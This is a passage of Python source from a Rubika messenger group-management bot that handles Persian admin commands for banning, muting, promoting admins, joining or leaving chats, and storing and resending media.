                                list_infos = {'موزیک': {'format': 'mp3', 'nick': 'audio'}, 'ویس': {'format': 'mpeg', 'nick': 'voice'}, 'عکس': {'format': 'png', 'nick': 'image'}, 'گیف': {'format': 'mp4', 'nick': 'gif'}, 'صدا': {'format': 'mpeg', 'nick': 'voice'}, 'اهنگ': {'format': 'mp3', 'nick': 'audio'}, 'فیلم': {'format': 'mp4', 'nick': 'video'}}
                                if type_result in list_infos:
                                    try:
                                        format = list_infos[type_result]['format']
                                        nick = list_infos[type_result]['nick']
                                        filename = f'{nick}_{get_iran_timestamp()}.{format}'
                                        client.download(object_guid, is_reply_message, True, 'Downloads/', filename)
                                        if os.path.path.isfile(f'Downloads/{filename}'):
                                            if nick == 'image':
                                                ResultME = client.send_image(object_guid, 'Downloads/' + filename, message_id)
                                                save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                            elif nick == 'video':
                                                ResultME = client.send_video(object_guid, 'Downloads/' + filename, message_id)
                                                save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                            elif nick == 'voice':
                                                ResultME = client.send_voice(object_guid, 'Downloads/' + filename, message_id, 1)
                                                save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                            elif nick == 'audio':
                                                ResultME = client.send_music(object_guid, 'Downloads/' + filename, message_id, 1, 'l\u200c8\u200cP\u200cB\u200cO\u200cT')
                                                save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                            elif nick == 'gif':
                                                ResultME = client.send_gif(object_guid, 'Downloads/' + filename, message_id)
                                                save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                            else:
                                                ResultME = True
                                    except:
                                        ResultME = send_message(OBJM, MPro('عملیات ناموفق بود. ' + ST['ok'], 2), message_id=message_id)
                    elif wordCount == 1:
                        if command.startswith('برکناری @'):
                            command = command.replace('برکناری', '').strip()
                            reply_message_guid = False
                            try:
                                reply_message_guid = client.get_chat_info_by_username(command)['user']['user_guid']
                            except Exception:
                                mess = MPro(f"کاربر یافت نشد. {ST['ok']}", 2)
                            if reply_message_guid:
                                if reply_message_guid == OWNER:
                                    mess = MPro(f"شما سازنده من هستید. {ST['ok']}", 2)
                                elif reply_message_guid not in FULL_ADMINS and reply_message_guid not in ADMINS and (reply_message_guid != HOWNER):
                                    mess = MPro(f"مقامی ندارد. {ST['ok']}", 2)
                                else:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') برکنار شد. ' + ST['ok'], 2)
                                if reply_message_guid == HOWNER:
                                    INFOS[object_guid]['owner'] = reply_message_guid
                                if reply_message_guid in FULL_ADMINS:
                                    del INFOS[object_guid]['full_admins'][reply_message_guid]
                                if reply_message_guid in ADMINS:
                                    del INFOS[object_guid]['admins'][reply_message_guid]
                                try:
                                    client.unset_admin(object_guid, reply_message_guid)
                                except:
                                    pass
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('برکناری u0'):
                            command = command.replace('برکناری', '').strip()
                            reply_message_guid = False
                            try:
                                reply_message_guid = client.get_chat_info(command)['user']['user_guid']
                            except Exception:
                                mess = MPro(f"کاربر یافت نشد. {ST['ok']}", 2)
                            if reply_message_guid:
                                if reply_message_guid == OWNER:
                                    mess = MPro(f"شما سازنده من هستید. {ST['ok']}", 2)
                                elif reply_message_guid not in FULL_ADMINS and reply_message_guid not in ADMINS and (reply_message_guid != HOWNER):
                                    mess = MPro(f"مقامی ندارد. {ST['ok']}", 2)
                                else:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') برکنار شد. ' + ST['ok'], 2)
                                if reply_message_guid == HOWNER:
                                    INFOS[object_guid]['owner'] = reply_message_guid
                                if reply_message_guid in FULL_ADMINS:
                                    del INFOS[object_guid]['full_admins'][reply_message_guid]
                                if reply_message_guid in ADMINS:
                                    del INFOS[object_guid]['admins'][reply_message_guid]
                                try:
                                    client.unset_admin(object_guid, reply_message_guid)
                                except:
                                    pass
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('ویژه @'):
                            command = command.replace('ویژه', '').strip()
                            reply_message_guid = False
                            try:
                                reply_message_guid = client.get_chat_info_by_username(command)['user']['user_guid']
                            except Exception:
                                mess = MPro(f"کاربر یافت نشد.{ST['ok']}", 2)
                            if reply_message_guid:
                                if reply_message_guid == OWNER:
                                    mess = MPro(f"شما سازنده من هستید. {ST['ok']}", 2)
                                elif reply_message_guid == HOWNER:
                                    mess = MPro(f"ایشون مالک من هستید. {ST['ok']}", 2)
                                elif reply_message_guid in FULL_ADMINS:
                                    mess = MPro(f"ایشون ادمین ویژه است. {ST['ok']}", 2)
                                else:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    INFOS[object_guid]['full_admins'][reply_message_guid] = first_name
                                    mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') ادمین ویژه شد. ' + ST['ok'], 2)
                                    client.set_admin(object_guid, reply_message_guid, [], random.choice(BoxEmoji))
                            else:
                                mess = MPro(f"کاربر یافت نشد. {ST['ok']}", 2)
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('ویژه u0'):
                            command = command.replace('ویژه', '').strip()
                            reply_message_guid = False
                            try:
                                reply_message_guid = client.get_chat_info(command)['user']['user_guid']
                            except Exception:
                                mess = MPro(f"کاربر یافت نشد. {ST['ok']}", 2)
                                return send_message(OBJM, mess, message_id=message_id)
                            if reply_message_guid:
                                if reply_message_guid == OWNER:
                                    mess = MPro(f"شما سازنده من هستید. {ST['ok']}", 2)
                                elif reply_message_guid == HOWNER:
                                    mess = MPro(f"ایشون مالک من هستید. {ST['ok']}", 2)
                                elif reply_message_guid in FULL_ADMINS:
                                    mess = MPro(f"ایشون ادمین ویژه است. {ST['ok']}", 2)
                                else:
                                    first_name = check_name(object_guid, reply_message_guid)
                                    INFOS[object_guid]['full_admins'][reply_message_guid] = first_name
                                    mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') ادمین ویژه شد. ' + ST['ok'], 2)
                                    client.set_admin(object_guid, reply_message_guid, [], random.choice(BoxEmoji))
                            else:
                                mess = MPro(f"کاربر یافت نشد. {ST['ok']}", 2)
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('مالک @'):
                            command = command.replace('مالک', '').strip()
                            reply_message_guid = False
                            try:
                                reply_message_guid = client.get_chat_info_by_username(command)['user']['user_guid']
                            except Exception:
                                mess = MPro(f"کاربر یافت نشد. {ST['ok']}", 2)
                            if reply_message_guid:
                                first_name = check_name(object_guid, reply_message_guid)
                                INFOS[object_guid]['owner'] = reply_message_guid
                                mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') مالک شد. ' + ST['ok'], 2)
                                client.set_admin(object_guid, reply_message_guid, [], random.choice(BoxEmoji))
                            else:
                                mess = MPro(f"کاربر یافت نشد. {ST['ok']}", 2)
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('عضویت '):
                            command = command.replace('عضویت', '').strip()
                            channel_guid = False
                            if command.startswith('@'):
                                try:
                                    channel_guid = client.get_chat_info_by_username(command)['channel']['channel_guid']
                                except:
                                    pass
                            elif command.startswith('https://'):
                                get_info = client.get_chat_preview(command)
                                if 'group' in get_info:
                                    channel_guid = get_info['group']['group_guid']
                                elif 'channel' in get_info:
                                    channel_guid = get_info['channel']['channel_guid']
                            if channel_guid:
                                INFOS[object_guid]['channels'][command] = channel_guid
                                mess = MPro('به لیست عضویت اضافه شد. ' + ST['ok'], 2)
                            else:
                                mess = MPro('نامعتبر است. ' + ST['ok'], 2)
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('افزودن @'):
                            mess = MPro('کاربر یافت نشد. ' + ST['ok'])
                            command = command.replace('افزودن', '').strip()
                            reply_message_guid = getinfos(command)
                            if reply_message_guid:
                                try:
                                    client.add_member(object_guid, [reply_message_guid])
                                    first_name = check_name(object_guid, reply_message_guid)
                                    mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ')  افزوده شد. ' + ST['ok'])
                                except Exception as e:
                                    print(e)
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('افزودن u0'):
                            mess = MPro('کاربر یافت نشد. ' + ST['ok'], 2)
                            command = command.replace('افزودن', '').strip()
                            reply_message_guid = getinfos(command, False)
                            if reply_message_guid:
                                try:
                                    client.add_member(object_guid, [reply_message_guid])
                                    first_name = check_name(object_guid, reply_message_guid)
                                    mess = MPro(f'کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ')  افزوده شد. ' + ST['ok'], 2)
                                except:
                                    pass
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('رسانه '):
                            command = command.replace('#', '').replace('رسانه', '').strip()
                            filename = command
                            list_media_tag = ['image', 'video', 'voice', 'audio', 'gif']
                            tag_name = False
                            for tag in list_media_tag:
                                if filename.startswith(tag):
                                    tag_name = tag
                                    break
                            if tag_name:
                                list_infos = {'image': 'png', 'video': 'mp4', 'voice': 'mpeg', 'audio': 'mp3', 'gif': 'mp4'}
                                format = list_infos[tag_name]
                                text = f'رسانه #{filename}'
                                if tag_name == 'gif' and filename in INLINES:
                                    i = {'object_guid': object_guid, 'file_inline': INLINES[filename], 'rnd': str(random.randint(10000000, 999999999)), 'reply_to_message_id': message_id}
                                    ResultME = client.methods.network.request(method='sendMessage', input=i)
                                else:
                                    filename_with_extension = filename if filename.endswith(f'.{format}') else f'{filename}.{format}'
                                    if os.path.isfile(f'Downloads/{filename_with_extension}'):
                                        if tag_name == 'image':
                                            ResultME = client.send_image(object_guid, file=f'Downloads/{filename_with_extension}', message_id=message_id)
                                        elif tag_name == 'video':
                                            ResultME = client.send_video(object_guid, file=f'Downloads/{filename_with_extension}', message_id=message_id)
                                        elif tag_name == 'voice':
                                            ResultME = client.send_voice(object_guid, file=f'Downloads/{filename_with_extension}', message_id=message_id, time=1)
                                        elif tag_name == 'audio':
                                            ResultME = client.send_music(object_guid, file=f'Downloads/{filename_with_extension}', message_id=message_id, time=1, performer='l\u200c8\u200cP\u200cB\u200cO\u200cT')
                                        elif tag_name == 'gif':
                                            ResultME = client.send_gif(object_guid, file=f'Downloads/{filename_with_extension}', message_id=message_id)
                                        save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                        elif command.startswith('جوین '):
                            command = command.replace('جوین', '').strip()
                            mess = False
                            if command.startswith('https://rubika.ir/joing/'):
                                stats = client.join_chat(command)['is_valid']
                                if stats:
                                    mess = MPro(f"عضو گروه شدم. {ST['ok']}", 2)
                                else:
                                    mess = MPro(f"لینک گروه نامعتبر است. {ST['ok']}", 2)
                            elif command.startswith('https://rubika.ir/joinc/'):
                                mess = MPro(f"لینک کانال نامعتبر است. 🚫{ST['ok']}", 2)
                                stats = client.join_chat(command)['is_valid']
                                if stats:
                                    mess = MPro(f"عضو کانال شدم. {ST['ok']}", 2)
                                else:
                                    mess = MPro(f"لینک کانال نامعتبر است. {ST['ok']}", 2)
                            elif command.startswith('@'):
                                result = client.get_chat_info_by_username(command)
                                if 'channel' in result:
                                    direction_guid = result['channel']['channel_guid']
                                else:
                                    mess = MPro(f"ایدی کانال نامعتبر است. 🚫{ST['ok']}", 2)
                                if client.join_chat(direction_guid)['chat_update']['object_guid']:
                                    mess = MPro(f"عضو کانال شدم. {ST['ok']}", 2)
                            if mess:
                                send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('لفت '):
                            UPFILES(file_users, USERS)
                            UPFILES(file_infos, INFOS)
                            UPFILES(file_speakx, SPEAKX)
                            link = command.replace('لفت', '').strip()
                            if len(link) > 0:
                                mess = 'نامعتبر است. 🚫'
                                chat_guid = None
                            else:
                                if link.startswith('https://rubika.ir/'):
                                    get_info = client.get_chat_preview(link)
                                    if 'group' in get_info:
                                        chat_guid = get_info['group']['group_guid']
                                    elif 'channel' in get_info:
                                        chat_guid = get_info['channel']['channel_guid']
                                elif link.startswith('g0'):
                                    chat_guid = link
                                elif link.startswith('c0'):
                                    chat_guid = link
                                elif link.startswith('@'):
                                    get_info = client.get_chat_info_by_username(link)
                                    if 'channel' in get_info:
                                        chat_guid = get_info['channel']['channel_guid']
                                if chat_guid:
                                    mess = MPro('لفت دادم. ' + ST['ok'])
                                    leave_from_group(client, chat_guid)
                            ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif wordCount == 2:
                        if command.startswith('حذف عضویت '):
                            command = command.replace('حذف عضویت', '').strip()
                            mess = MPro(f"در لیست عضویت قرار ندارد. {ST['ok']}", 2)
                            if command in INFOS[object_guid]['channels']:
                                del INFOS[object_guid]['channels'][command]
                                mess = MPro(f"از لیست عضویت حذف شد. {ST['ok']}", 2)
                            send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('پاکسازی لیست '):
                            c = command.replace('پاکسازی لیست', '').strip()
                            result = delete_all_media_pro(OBJM, c)
                            if result:
                                ResultME = send_message(OBJM, result, message_id=message_id)
                        elif command.startswith('حذف رسانه '):
                            command = command.replace('#', '').replace('حذف رسانه', '').strip()
                            filename = command
                            list_media_tag = ['image', 'video', 'voice', 'audio', 'gif']
                            tag_name = None
                            for tag in list_media_tag:
                                if filename.startswith(tag):
                                    tag_name = tag
                                    break
                            if tag_name:
                                mess = MPro(f"تگ #{tag_name} موجود نیست. {ST['ok']}", 2)
                                list_infos = {'image': 'png', 'video': 'mp4', 'voice': 'mp3', 'audio': 'mp3', 'gif': 'gif'}
                                format = list_infos[tag_name]
                                if tag_name == 'gif' and filename in INLINES:
                                    del INLINES[filename]
                                    mess = MPro(f"تگ #{tag_name} حذف شد. {ST['ok']}", 2)
                                tag_file = filename
                                if not filename.endswith(f'.{format}'):
                                    filename += f'.{format}'
                                if os.path.isfile(f'Downloads/{filename}'):
                                    os.remove(f'Downloads/{filename}')
                                    mess = MPro(f"تگ #{tag_file} حذف شد. {ST['ok']}", 2)
                                ResultME = send_message(OBJM, mess, message_id=message_id)
                        if command.startswith('شارژ گروه ') or command.startswith('تنظیم شارژ '):
                            new_timeout = command.replace('شارژ گروه', '').replace('تنظیم شارژ', '').strip()
                            try:
                                new_timeout = int(new_timeout) * 86400
                            except:
                                new_timeout = False
                            if new_timeout:
                                if 'timeout' in INFOS[object_guid]:
                                    INFOS[object_guid]['timeout'] = False
                                timeout = INFOS[object_guid].get('timeout')
                                if not timeout:
                                    timeout = get_iran_timestamp()
                                result_timeout = timeout + new_timeout
                                INFOS[object_guid]['timeout'] = result_timeout
                                time_now = get_iran_timestamp()
                                mess = MPro(f"{Time_pass(new_timeout)} به شارژ گروه اضافه شد. {ST['ok']}")
                                mess += MPro(f"شارژ گروه : {Time_pass(result_timeout - time_now)}")
                                ResultME = send_message(OBJM, mess, message_id)
                            else:
                                print('Invalid timeout')
                elif TIP == 3:
                    if is_reply_message and command in list_command_goldadmin_reply_keys:
                        text = list_command_goldadmin_reply[command](OBJM)
                        if text:
                            send_message(OBJM, text, message_id)
                        ResultME = True
                    elif command in list_command_goldadmin_keys:
                        if command in list_filter_metadata:
                            metadata = False
                        else:
                            metadata = True
                        text = list_command_goldadmin[command](OBJM)
                        if text:
                            send_message(OBJM, text, message_id, metadata=metadata)
                        ResultME = True
                    elif command.startswith('برکناری @'):
                        command = command.replace('برکناری', '').strip()
                        reply_message_guid = False
                        try:
                            reply_message_guid = client.get_chat_info_by_username(command)['user']['user_guid']
                        except Exception:
                            mess = MPro(f" کاربر یافت نشد. {ST['ok']}", 2)
                        if reply_message_guid:
                            if reply_message_guid == OWNER:
                                mess = MPro(f" ایشون سازنده من است{ST['ok']}", 2)
                            elif reply_message_guid == HOWNER:
                                mess = MPro(f" شما مالک من هستید{ST['ok']}", 2)
                            elif reply_message_guid not in FULL_ADMINS and reply_message_guid not in ADMINS:
                                mess = MPro(f" مقامی ندارد{ST['ok']}", 2)
                            else:
                                first_name = check_name(object_guid, reply_message_guid)
                                mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') برکنار شد. ' + ST['ok'], 2)
                            if reply_message_guid == HOWNER:
                                INFOS[object_guid]['owner'] = OWNER
                            if reply_message_guid in FULL_ADMINS:
                                del INFOS[object_guid]['full_admins'][reply_message_guid]
                            if reply_message_guid in ADMINS:
                                del INFOS[object_guid]['admins'][reply_message_guid]
                            try:
                                client.unset_admin(object_guid, reply_message_guid)
                            except:
                                pass
                        ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command.startswith('ویژه @'):
                        command = command.replace('ویژه', '').strip()
                        try:
                            reply_message_guid = client.get_chat_info_by_username(command)['user']['user_guid']
                        except Exception:
                            mess = MPro(f" کاربر یافت نشد. {ST['ok']}")
                        if reply_message_guid:
                            if reply_message_guid == OWNER:
                                mess = MPro(f" ایشون سازنده من است{ST['ok']}")
                            elif reply_message_guid == HOWNER:
                                mess = MPro(f" شما مالک من هستید{ST['ok']}")
                            elif reply_message_guid in FULL_ADMINS:
                                mess = MPro(f" ایشون ادمین ویژه است{ST['ok']}")
                            else:
                                first_name = check_name(object_guid, reply_message_guid)
                                INFOS[object_guid]['full_admins'][reply_message_guid] = first_name
                                mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') ادمین ویژه شد. ' + ST['ok'])
                            try:
                                client.set_admin(object_guid, reply_message_guid)
                            except Exception:
                                pass
                        ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command.startswith('ویژه u0'):
                        command = command.replace('ویژه', '').strip()
                        try:
                            reply_message_guid = client.get_chat_info(command)['user']['user_guid']
                        except Exception:
                            mess = MPro(f" کاربر یافت نشد. {ST['ok']}")
                        if reply_message_guid:
                            if reply_message_guid == OWNER:
                                mess = MPro(f" ایشون سازنده من است{ST['ok']}")
                            elif reply_message_guid == HOWNER:
                                mess = MPro(f" شما مالک من هستید{ST['ok']}")
                            elif reply_message_guid in FULL_ADMINS:
                                mess = MPro(f" ایشون ادمین ویژه است{ST['ok']}")
                            else:
                                first_name = check_name(object_guid, reply_message_guid)
                                INFOS[object_guid]['full_admins'][reply_message_guid] = first_name
                                mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') ادمین ویژه شد. ' + ST['ok'])
                            try:
                                client.set_admin(object_guid, reply_message_guid)
                            except Exception:
                                pass
                        ResultME = send_message(OBJM, mess, message_id=message_id)
                if TIP == 2 and (not ResultME):
                    if is_reply_message and command in list_command_fulladmins_reply_keys:
                        text = list_command_fulladmins_reply[command](OBJM)
                        if text:
                            send_message(OBJM, text, message_id)
                        ResultME = True
                    elif command in list_command_fulladmins_keys:
                        if command in list_filter_metadata:
                            metadata = False
                        else:
                            metadata = True
                        text = list_command_fulladmins[command](OBJM)
                        if text:
                            send_message(OBJM, text, message_id, metadata=metadata)
                        ResultME = True
                if TIP >= 2 and (not ResultME):
                    if is_reply_message:
                        if wordCount >= 2:
                            if command.startswith('تنظیم لقب ') or command.startswith('ثبت لقب '):
                                info = command.replace('تنظیم لقب', '').strip().replace('ثبت لقب', '').strip()
                                reply_message = GetInfoByMessageId(object_guid, is_reply_message)
                                if reply_message:
                                    reply_message_guid = GetReplyGuid(reply_message)
                                    if reply_message_guid and reply_message_guid in USERS[object_guid]:
                                        USERS[object_guid][reply_message_guid] = [0, 0, info, 'ناشناس']
                                        send_message(OBJM, 'لقب تنظیم شد. ', message_id=message_id)
                                        ResultME = True
                                        return ResultME
                            elif command.startswith('تنظیم اصل ') or command.startswith('ثبت اصل '):
                                info = command.replace('ثبت اصل', '').strip()
                                info = info.replace('تنظیم اصل', '').strip()
                                reply_message = GetInfoByMessageId(object_guid, is_reply_message)
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                if reply_message:
                                    reply_message_guid = GetReplyGuid(reply_message)
                                    if reply_message_guid:
                                        if reply_message_guid not in USERS[object_guid]:
                                            getInfoUser(object_guid, reply_message_guid, info)
                                        else:
                                            USERS[object_guid][reply_message_guid][3] = info
                                        mess = MPro('اصل تنظیم شد. ' + ST['ok'], 2)
                                ResultME = send_message(OBJM, mess, message_id=message_id)
                    if wordCount == 1:
                        if command.startswith('یادداشت '):
                            num = command.replace('یادداشت', '').strip()
                            try:
                                num = int(num)
                            except ValueError:
                                num = 0
                            rem = INFOS[object_guid]['remmember'].get(num, False)
                            if rem:
                                send_message(OBJM, f"یادداشت 〔 💬 ‿〕 {rem['text']}", message_id=message_id)
                            else:
                                send_message(OBJM, 'یادداشت موجود نمیباشد.', message_id=message_id)
                            return ResultME
                        elif command.startswith('پاسخدهی '):
                            num = command.replace('پاسخدهی', '').strip()
                            try:
                                num = int(num)
                            except ValueError:
                                num = 0
                            if num > 3600:
                                num = 3600
                            elif num < 0:
                                num = 0
                            client.edit_group_info(object_guid, slow_mode=num)
                            ResultME = send_message(OBJM, MPro(f"پاسخدهی {num} ثانیه تنظیم شد. {ST['ok']}"), message_id=message_id)
                            return ResultME
                        elif command.startswith('لیست '):
                            media = command.replace('لیست', '').strip()
                            result = get_my_media_pro(OBJM, media)
                            if result:
                                ResultME = send_message(OBJM, result, message_id=message_id)
                        elif command.startswith('Sleep'):
                            sleepcmd = command.replace('Sleep', '').strip()
                            if sleepcmd.isnumeric():
                                sleepcmd = int(sleepcmd)
                            else:
                                sleepcmd = 10
                            if sleepcmd > 60:
                                sleepcmd = 60
                            elif sleepcmd < 1:
                                sleepcmd = 1
                            ResultME = send_message(OBJM, MPro(f"sleeping mode {sleepcmd} seconds {ST['ok']}"), message_id=message_id)
                            time.sleep(sleepcmd)
                            return ResultME
                    if wordCount == 2:
                        if command.startswith('بهینه سازی '):
                            lims = command.replace('بهینه سازی ', '').strip()
                            iscount = False
                            nums = int(lims)
                            if 0 > nums:
                                nums = 10
                            else:
                                iscount = True
                            if iscount:
                                deleting = []
                                Alls = 0
                                User = 0
                                for user_guid in USERS[object_guid]:
                                    try:
                                        if user_guid != GUIDME:
                                            user = USERS[object_guid][user_guid]
                                            mes = user[0]
                                            state = mes
                                            if state <= nums:
                                                Alls += mes
                                                User += 1
                                                deleting.append(user_guid)
                                            else:
                                                continue
                                    except Exception as e:
                                        print(e)
                                        continue
                                for user_guid in deleting:
                                    del USERS[object_guid][user_guid]
                                try:
                                    with open(file_users, 'w') as outfile:
                                        json.dump(USERS, outfile)
                                except Exception as e:
                                    print(e)
                                JoindUsers[object_guid] = []
                                mess = MPro('کاربران با تعداد پیام کمتر از ' + str(nums) + ' از حافظه پاک شد. ' + ST['ok'] + '\nدر مجموع ' + str(Alls) + ' پیام و ' + str(User) + ' کاربر پاک شده است.' + ST['ok'], 2)
                                ResultME = send_message(OBJM, mess, message_id=message_id)
                                deleting = []
                                Alls = 0
                        elif command.startswith('حذف یادداشت '):
                            num = command.replace('حذف یادداشت', '').strip()
                            try:
                                num = int(num)
                            except ValueError:
                                num = 0
                            if num in INFOS[object_guid]['remmember']:
                                INFOS[object_guid]['remmember'].pop(num)
                                mess = MPro('از لیست یادداشت حذف شد. ' + ST['ok'])
                                send_message(OBJM, mess, message_id=message_id)
                            else:
                                mess = MPro('در لیست یادداشت موجود نیست. ' + ST['ok'])
                                send_message(OBJM, mess, message_id=message_id)
                        elif command.startswith('حذف تایمر '):
                            num = command.replace('حذف تایمر', '').strip()
                            try:
                                num = int(num)
                            except ValueError:
                                num = 0
                            if num < len(INFOS[object_guid]['AUTOS']):
                                INFOS[object_guid]['AUTOS'].pop(num)
                                mess = MPro('از لیست تایمر حذف شد. ' + ST['ok'])
                                send_message(OBJM, mess, message_id=message_id)
                            else:
                                mess = MPro('در لیست تایمر موجود نیست. ' + ST['ok'])
                                send_message(OBJM, mess, message_id=message_id)
                        if command.startswith('پاکسازی لیست '):
                            xcomand = command.replace('پاکسازی لیست', '').strip()
                            isok = False
                            if xcomand == 'سکوت':
                                INFOS[object_guid]['silent_list'] = {}
                                isok = True
                            elif xcomand == 'معاف':
                                INFOS[object_guid]['exempt_list'] = {}
                                isok = True
                            elif xcomand == 'کیل':
                                INFOS[object_guid]['black_list'] = []
                                isok = True
                            elif xcomand == 'فیلتر':
                                INFOS[object_guid]['filterlist'] = []
                                isok = True
                            elif xcomand == 'کلید':
                                INFOS[object_guid]['main_keys'] = []
                                isok = True
                            elif xcomand == 'تایمر':
                                INFOS[object_guid]['AUTOS'] = []
                                isok = True
                            elif xcomand == 'ادمین':
                                admins = INFOS[object_guid]['admins']
                                INFOS[object_guid]['admins'] = {}
                                has_continue = True
                                next_start_id = None
                                count = 0
                                while has_continue:
                                    result = client.get_admin_members(object_guid, next_start_id)
                                    has_continue = result['has_continue']
                                    if 'next_start_id' in result:
                                        next_start_id = result['next_start_id']
                                    for admin in result['in_chat_members']:
                                        member_guid = admin['member_guid']
                                        if member_guid not in [OWNER, HOWNER, GUIDME] and member_guid not in FULL_ADMINS:
                                            try:
                                                client.unset_admin(object_guid, member_guid)
                                            except:
                                                pass
                                        count += 1
                                if count == 0:
                                    mess = MPro('لیست ادمین خالی است ' + ST['ok'])
                                else:
                                    mess = MPro('لیست ادمین پاکسازی شد. ' + ST['ok']) + MPro('تعداد برکناری ها : ' + str(count))
                                send_message(OBJM, mess, message_id=message_id)
                            elif xcomand == 'عضویت':
                                INFOS[object_guid]['channels'] = {}
                                isok = True
                            elif xcomand == 'یادداشت':
                                INFOS[object_guid]['remmember'] = []
                                isok = True

                            if isok:
                                ResultME = send_message(OBJM, MPro('لیست ' + xcomand + ' پاکسازی شد. ' + ST['ok']), message_id=message_id)

                    if not ResultME and wordCount > 0:

                        mess = False
                        if wordCount <= 2:
                            if command.startswith('https://rubika.ir/joing/') or command.startswith('https://rubika.ir/joinc/'):
                                command = command.replace('https://rubika.ir/', '@', 1)
                            if command.startswith('بن @'):
                                mess = MPro('کاربر یافت نشد.' + ST['ok'])
                                command = command.replace('بن', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    elif reply_message_guid in ADMINS:
                                        mess = MPro('ایشون ادمین است.' + ST['ok'])
                                    else:
                                        INFOS[object_guid]['ban'] += 1
                                        first_name = check_name(object_guid, reply_message_guid)
                                        mess = MPro(f'کاربر @@ {first_name} @@({reply_message_guid}) بن شد. ' + ST['ok'], 2)
                                        client.ban_member(object_guid, reply_message_guid)
                                        resetUser(reply_message_guid, object_guid)
                            elif command.startswith('بن u0'):
                                mess = MPro('کاربر یافت نشد.' + ST['ok'])
                                command = command.replace('بن', '')
                                reply_message_guid = getinfos(command, False)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    elif reply_message_guid in ADMINS:
                                        mess = MPro('ایشون ادمین است.' + ST['ok'])
                                    else:
                                        INFOS[object_guid]['ban'] += 1
                                        first_name = check_name(object_guid, reply_message_guid)
                                        mess = MPro(f'کاربر @@ {first_name} @@({reply_message_guid}) بن شد. ' + ST['ok'], 2)
                                        client.ban_member(object_guid, reply_message_guid)
                                        resetUser(reply_message_guid, object_guid)
                            elif command.startswith('سکوت @'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('سکوت', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    elif reply_message_guid in ADMINS:
                                        mess = MPro('ایشون ادمین است.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
                                        if reply_message_guid in INFOS[object_guid]['silent_list']:
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') در لیست سکوت بود. ' + ST['ok'], 2)
                                        else:
                                            INFOS[object_guid]['silent_list'][reply_message_guid] = first_name
                                            mess = MPro('کاربر @@ ' + first_name + ' @@(' + reply_message_guid + ') به لیست سکوت اضافه شد. ' + ST['ok'], 2)
                            elif command.startswith('معاف @'):
                                mess = MPro('کاربر شناسایی نشد.' + ST['ok'], 2)
                                command = command.replace('معاف', '')
                                reply_message_guid = getinfos(command)
                                if reply_message_guid:
                                    if reply_message_guid == OWNER:
                                        mess = MPro('ایشون سازنده من هستید.' + ST['ok'])
                                    elif reply_message_guid == HOWNER:
                                        mess = MPro('ایشون مالک من هستید.' + ST['ok'])
                                    elif reply_message_guid == GUIDME:
                                        mess = MPro('ایشون من هستم.' + ST['ok'])
                                    elif reply_message_guid in FULL_ADMINS:
                                        mess = MPro('ایشون ادمین ویژه است.' + ST['ok'])
                                    elif reply_message_guid in ADMINS:
                                        mess = MPro('ایشون ادمین است.' + ST['ok'])
                                    else:
                                        first_name = check_name(object_guid, reply_message_guid)
